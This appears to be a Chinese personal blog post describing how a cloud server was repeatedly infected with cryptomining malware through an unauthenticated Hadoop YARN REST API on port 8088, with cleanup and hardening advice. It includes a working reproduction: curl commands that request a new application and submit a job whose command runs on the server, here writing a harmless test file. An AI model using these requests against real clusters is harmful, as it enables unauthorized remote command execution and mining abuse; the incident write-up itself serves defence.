---
title: 消灭利用Hadoop Yarn未授权漏洞挖矿病毒
date: 2022-04-26 22:01:14
tags:
---

# 消灭利用Hadoop Yarn未授权漏洞挖矿病毒

参考文档：[https://www.freebuf.com/articles/system/261076.html](https://www.freebuf.com/articles/system/261076.html)

参考文档：[https://paper.seebug.org/611/](https://paper.seebug.org/611/)

**一、背景**

最近一段时间，我们的云服经常收到安全报警。top的时候，发现有几个核的使用率是100%。找到相应的进程，却发现exe指向一个已删除的文件（**ld-linux-x86-64**），查看了crontab没有异常，所以就直接kill了。怀疑密码泄露，于是修改了root密码，修改了ssh端口。

消停了几天，问题又来了，这次是另外一种挖矿病毒。例行kill后，开始考虑病毒来源，这次发现进程的USER是我们的hadoop里面（使用Docker部署）创建的一个USER。猜测可能是因为docker上root的密码太简单了（123456），攻击者通过Docker注入了病毒，于是修改了hadoop docker上root的密码。

但是问题没有从根本解决，病毒还是野火烧不尽，春风吹又生。已经基本确定的是，病毒是通过Hadoop注入进来的。查看docker里tmp文件夹，找到了病毒文件。修改了/tmp的权限。但是治标不治本，因为病毒的入口并未定位到，于是我暂时关闭了这个Docker。

现在终于有点时间来解决这个问题，于是找到了这篇文章：H**adoop Yarn REST API 未授权漏洞利用挖矿分析**（[https://paper.seebug.org/611/](https://paper.seebug.org/611/)）。才发现攻击者是利用Hadoop Yarn资源管理系统REST API未授权漏洞对服务器进行攻击，在未授权的情况下远程执行代码，进行挖矿。

**二、漏洞说明**

YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为。

### 三、**攻击步骤（利用PostMan复现）：**

1.申请新的application

直接通过curl进行POST请求

```
curl -v -X POST 'http://ip:8088/ws/v1/cluster/apps/new-application'
```

返回内容类似于（注意第一行的application-id)：

```
{
    "application-id": "application_1637028888425_0001",
    "maximum-resource-capability": {
        "memory": 8192,
        "vCores": 4,
        "resourceInformations": {
            "resourceInformation": [
                {
                    "maximumAllocation": 9223372036854775807,
                    "minimumAllocation": 0,
                    "name": "memory-mb",
                    "resourceType": "COUNTABLE",
                    "units": "Mi",
                    "value": 8192
                },
                {
                    "maximumAllocation": 9223372036854775807,
                    "minimumAllocation": 0,
                    "name": "vcores",
                    "resourceType": "COUNTABLE",
                    "units": "",
                    "value": 4
                }
            ]
        }
    }
}
```

2.构造并提交任务

Postman body（设置为raw→json), 填写内容如下，其中application-id对应上面得到的id，命令内容为尝试在/var/tmp目录下创建`11112222_test_111122222`文件，内容也为111：

```
{
    "am-container-spec":{
        "commands":{
            "command":"echo '111' > /var/tmp/11112222_test_11112222"

        }
    },
    "application-id":"application_1637028888425_0001",
    "application-name":"test",
    "application-type":"YARN"
}
```

然后直接

```
curl -s -i -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' http://ip:8088/ws/v1/cluster/apps --data-binary @1.json
```

即可完成攻击，命令被执行，在相应目录下可以看到生成了对应文件。

### **三、入侵分析（略）**

在本次分析的案例中，受害机器部署有Hadoop YARN，并且存在未授权访问的安全问题，黑客直接利用开放在8088的REST API提交执行命令，来实现在服务器内下载执行.sh脚本，从而再进一步下载启动挖矿程序达到挖矿的目的。

### **四、安全建议**

### **清理病毒**

1. 使用top查看进程，kill掉异常进程
2. 检查/tmp和/var/tmp目录，删除java、ppc、w.conf等异常文件
3. 检查crontab任务列表，删除异常任务
4. 排查YARN日志，确认异常的application，删除处理

### **安全加固**

1. 通过iptables或者安全组配置访问策略，限制对8088等端口的访问
2. 如无必要，不要将接口开放在公网，改为本地或者内网调用
3. 升级Hadoop到2.x版本以上，并启用Kerberos认证功能，禁止匿名访问

## 五、解决方案：

1. 因为我暂时没有时间去研究Kerberos，暂时还用不到Yarn的服务，所以直接把8088端口禁用了。以观后效。